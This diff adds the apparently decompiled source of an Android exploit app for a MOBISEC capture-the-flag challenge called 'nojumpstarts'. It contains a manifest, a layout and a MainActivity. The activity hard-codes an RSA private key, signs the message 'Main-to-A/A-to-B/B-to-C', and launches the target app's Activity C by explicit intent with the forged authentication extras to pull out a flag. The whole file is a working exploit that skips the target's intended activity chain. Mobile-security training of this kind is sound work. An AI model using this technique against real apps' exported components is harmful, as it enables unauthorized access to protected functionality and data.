@@ -1,0 +1,248 @@
+AndroidManifest.xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    android:versionCode="1"
+    android:versionName="1.0"
+    android:compileSdkVersion="34"
+    android:compileSdkVersionCodename="14"
+    package="com.mobisec.nojumpstartexploit"
+    platformBuildVersionCode="34"
+    platformBuildVersionName="14">
+    <uses-sdk
+        android:minSdkVersion="22"
+        android:targetSdkVersion="28"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <permission
+        android:name="com.mobisec.nojumpstartexploit.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:protectionLevel="signature"/>
+    <uses-permission android:name="com.mobisec.nojumpstartexploit.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
+    <application
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        android:label="@string/app_name"
+        android:debuggable="true"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        android:extractNativeLibs="true"
+        android:usesCleartextTraffic="true"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory">
+        <activity
+            android:name="com.mobisec.nojumpstartexploit.MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:exported="false"
+            android:authorities="com.mobisec.nojumpstartexploit.androidx-startup">
+            <meta-data
+                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+                android:value="androidx.startup"/>
+            <meta-data
+                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+                android:value="androidx.startup"/>
+        </provider>
+    </application>
+</manifest>
+
+com.mobisec.nojumpstartexploit.MainActivity
+package com.mobisec.nojumpstartexploit;
+
+import android.content.ComponentName;
+import android.content.Intent;
+import android.os.Bundle;
+import android.util.Base64;
+import android.util.Log;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+import java.nio.charset.StandardCharsets;
+import java.security.KeyFactory;
+import java.security.PrivateKey;
+import java.security.Signature;
+import java.security.spec.PKCS8EncodedKeySpec;
+
+/* loaded from: classes3.dex */
+public class MainActivity extends AppCompatActivity {
+    private static final String AUTH_MSG = "Main-to-A/A-to-B/B-to-C";
+    private static final String PRIVKEY_PKCS1_B64 = "MIIEowIBAAKCAQEA0vKu6oHF6wkA+gDdqhcsreLzlY9KLdNQBSSrlvWcZxmMglQU4oL017CvuTAqSWJmPlsO0c0fNy6yE+iOA2SrhTM0RJ229fl6VDcFyHnG4grmcfslj2J3lCAssdON5tgrbRvt/FRrkF06x7rLCWiQbcWZgt/Yj+ONbPHeHIImSzUkNkJCMMlwIv/l/Oz1gN6Pn6KZQxiASSqR5uS7v92vYXGpusLjvfLpFzCEBYbBEpguxmQFpfvyKZQHiimiEgqvWvOaNV8FKNi2/eELD3jre6U0ng/eSlhP9FKrt109xdgw96ffVYK0o9o9IJm44RZFYvTjLIBGYI7uwaAgJK+rFQIDAQABAoIBACD/rbUpj9hwlCKHuCU/ctHQyuH+hFAe2kmzrtPyoADQ0lYg6RN2AO8syJBjpHnOVsgyXmMbf2KWf2z12CFXwi0YEXkaYuCfoi9CXDk8M4xwwBPcgceoU6RsVBGNUolmD4UF9XifjCQNMYDFC7XxEYbafmUmty3rHtiIDYLQKUViRe/gisYtWC1OdAZ0s/Q/rdpf9EVCcmKDlDxc8zoRA8gmF4EwJrVwpqvdSqmwTQPGjrkFfv0fxJk5iYiId+FONKtcXFvmZ7i0o9bBBeJdmJySlOr/9oCs29R/ZUkW13H9zGftKX0pp64qgxy/yGoe/lQunzYete5l5X1te/wnORECgYEA9ktAziObm/7uDHl3hpi6rj7SKE7EvxB2mvfLGfXNUM3t4c1K8Sdp61H7rufuv+Ebz4PpS7pm2sctUmXvlp0Z+HxOsqDEKU/0FByN2O8Qnc5H8yFfTVLRMYwS4EqvDcsG9J7YywlRlQ+z1Fy18VEgGcgWWoiKNAPrKcTMMoO7/dsCgYEA20LXPIxtS6J0s1Xk16kF9oCIKOiSsJ3vbRjSU2ffewOJYhCizMrjyDhfUcuED3mDGg0i7ctAWPuRfQ4z13ku5GCQ711mh5F3wA+mLr7vRVUwEk2F4PUL81LkwblJl4meb3Gj/pCiEeYy9mrr8N3JAxK0f4hYdITlmFtXvQtyZc8CgYEAjOnRUh+dUEsy94AnmqKXbEoVA2rNtmM8+Lz9PwUbSzgG+kHytrbOKwzk6tVYDABHYRsfx2wGnPWIQLSBt7J6wWidviWtFdXg2ADeR1fAMglrsPdPB3Zyqd5yjlEshr+6YwrfDotuWdJ6GO5SSpcXvqhz4ahtKgVz7pniGqS0UjECgYAMyymj7s2xzBjjHe/sZYBjkbxgJrHofE6sHvamxzjTBLHPdwkIyg3gcOme7DEYdg6gRoPzPBjVGFi0409DE18ZFElgriJ9Zo+GNWOM9rcfZIkZiEx3g9TerceLRjR1EyKbfhYDlIzgXn46wqJhu48vDrhZeKswoVCEQ1ArR6+1IQKBgF78mW4Si37+WtTdsPE6tA8wzqXJJE7+6geD4tkVKovU25yGsyinihXVT3mhPCK7rJ5EoksAdrGKEmX5O1JqF0vwjUYNxtTLvpIraYKQSXlIaT3m4sI3BlcorfqFhHLw9qfYnmQQXhaXGBhZLQFYMKaYURg5/Z55Xmpmr//mK58m";
+    private static final int REQ_C = 1337;
+    private static final String TAG = "MOBISEC";
+    private TextView tv;
+
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        this.tv = (TextView) findViewById(R.id.textView);
+        setStatus("Generating signature...");
+        new Thread(new Runnable() { // from class: com.mobisec.nojumpstartexploit.MainActivity$$ExternalSyntheticLambda2
+            @Override // java.lang.Runnable
+            public final void run() {
+                this.f$0.m40lambda$onCreate$2$commobisecnojumpstartexploitMainActivity();
+            }
+        }).start();
+    }
+
+    /* renamed from: lambda$onCreate$2$com-mobisec-nojumpstartexploit-MainActivity, reason: not valid java name */
+    /* synthetic */ void m40lambda$onCreate$2$commobisecnojumpstartexploitMainActivity() {
+        try {
+            PrivateKey sk = loadRsaPrivateKeyFromPkcs1Base64(PRIVKEY_PKCS1_B64);
+            final byte[] sig = rsaSignSha256(sk, AUTH_MSG.getBytes(StandardCharsets.UTF_8));
+            runOnUiThread(new Runnable() { // from class: com.mobisec.nojumpstartexploit.MainActivity$$ExternalSyntheticLambda0
+                @Override // java.lang.Runnable
+                public final void run() {
+                    this.f$0.m38lambda$onCreate$0$commobisecnojumpstartexploitMainActivity(sig);
+                }
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "Exploit failed: " + e);
+            runOnUiThread(new Runnable() { // from class: com.mobisec.nojumpstartexploit.MainActivity$$ExternalSyntheticLambda1
+                @Override // java.lang.Runnable
+                public final void run() {
+                    this.f$0.m39lambda$onCreate$1$commobisecnojumpstartexploitMainActivity(e);
+                }
+            });
+        }
+    }
+
+    /* renamed from: lambda$onCreate$0$com-mobisec-nojumpstartexploit-MainActivity, reason: not valid java name */
+    /* synthetic */ void m38lambda$onCreate$0$commobisecnojumpstartexploitMainActivity(byte[] sig) {
+        setStatus("Launching target Activity C...");
+        launchTargetC(AUTH_MSG, sig);
+    }
+
+    /* renamed from: lambda$onCreate$1$com-mobisec-nojumpstartexploit-MainActivity, reason: not valid java name */
+    /* synthetic */ void m39lambda$onCreate$1$commobisecnojumpstartexploitMainActivity(Exception e) {
+        setStatus("Exploit failed: " + e.getClass().getSimpleName());
+    }
+
+    private void setStatus(String s) {
+        if (this.tv != null) {
+            this.tv.setText(s);
+        }
+        Log.e(TAG, s);
+    }
+
+    private static byte[] rsaSignSha256(PrivateKey sk, byte[] msg) throws Exception {
+        Signature s = Signature.getInstance("SHA256withRSA");
+        s.initSign(sk);
+        s.update(msg);
+        return s.sign();
+    }
+
+    private static PrivateKey loadRsaPrivateKeyFromPkcs1Base64(String b64Pkcs1) throws Exception {
+        byte[] pkcs1 = Base64.decode(b64Pkcs1, 0);
+        byte[] pkcs8 = wrapPkcs1ToPkcs8(pkcs1);
+        KeyFactory kf = KeyFactory.getInstance("RSA");
+        return kf.generatePrivate(new PKCS8EncodedKeySpec(pkcs8));
+    }
+
+    private static byte[] wrapPkcs1ToPkcs8(byte[] pkcs1) {
+        byte[] version = {2, 1, 0};
+        byte[] oidRsa = {6, 9, 42, -122, 72, -122, -9, 13, 1, 1, 1};
+        byte[] nullParam = {5, 0};
+        byte[] algId = derSequence(concat(oidRsa, nullParam));
+        byte[] privateKeyOctet = derOctetString(pkcs1);
+        return derSequence(concat(version, algId, privateKeyOctet));
+    }
+
+    private static byte[] derSequence(byte[] content) {
+        return concat(new byte[]{48}, derLength(content.length), content);
+    }
+
+    private static byte[] derOctetString(byte[] content) {
+        return concat(new byte[]{4}, derLength(content.length), content);
+    }
+
+    private static byte[] derLength(int len) {
+        if (len < 128) {
+            return new byte[]{(byte) len};
+        }
+        int bytesNeeded = 0;
+        for (int tmp = len; tmp > 0; tmp >>= 8) {
+            bytesNeeded++;
+        }
+        byte[] out = new byte[bytesNeeded + 1];
+        out[0] = (byte) (bytesNeeded | 128);
+        for (int i = bytesNeeded; i >= 1; i--) {
+            out[i] = (byte) (len & 255);
+            len >>= 8;
+        }
+        return out;
+    }
+
+    private static byte[] concat(byte[]... parts) {
+        int total = 0;
+        int length = parts.length;
+        for (int i = 0; i < length; i++) {
+            byte[] p = parts[i];
+            total += p == null ? 0 : p.length;
+        }
+        byte[] out = new byte[total];
+        int off = 0;
+        for (byte[] p2 : parts) {
+            if (p2 != null) {
+                System.arraycopy(p2, 0, out, off, p2.length);
+                off += p2.length;
+            }
+        }
+        return out;
+    }
+
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode != REQ_C) {
+            return;
+        }
+        if (data == null) {
+            Log.e(TAG, "Returned from Activity C but Intent data is null (resultCode=" + resultCode + ")");
+            setStatus("Returned from C, but no data");
+            return;
+        }
+        String flag = data.getStringExtra("flag");
+        if (flag == null) {
+            flag = data.getStringExtra("FLAG");
+        }
+        if (flag == null) {
+            Log.e(TAG, "Returned from C but no flag extra (resultCode=" + resultCode + ")");
+            setStatus("Returned from C, but no flag");
+        } else {
+            Log.e(TAG, "FLAG=" + flag);
+            setStatus("FLAG=" + flag);
+        }
+    }
+
+    private void launchTargetC(String authMsg, byte[] authSig) {
+        Intent i = new Intent();
+        i.setComponent(new ComponentName("com.mobisec.nojumpstarts", "com.mobisec.nojumpstarts.C"));
+        i.putExtra("authmsg", authMsg);
+        i.putExtra("authsign", authSig);
+        startActivityForResult(i, REQ_C);
+    }
+}
+
+res/layout/activity_main.xml
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:orientation="vertical"
+    android:padding="16dp"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent">
+    <TextView
+        android:textSize="16sp"
+        android:id="@+id/textView"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="Idle"/>
+    <TextView
+        android:textSize="16sp"
+        android:id="@+id/flag"
+        android:paddingTop="12dp"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text=""/>
+</LinearLayout>
+
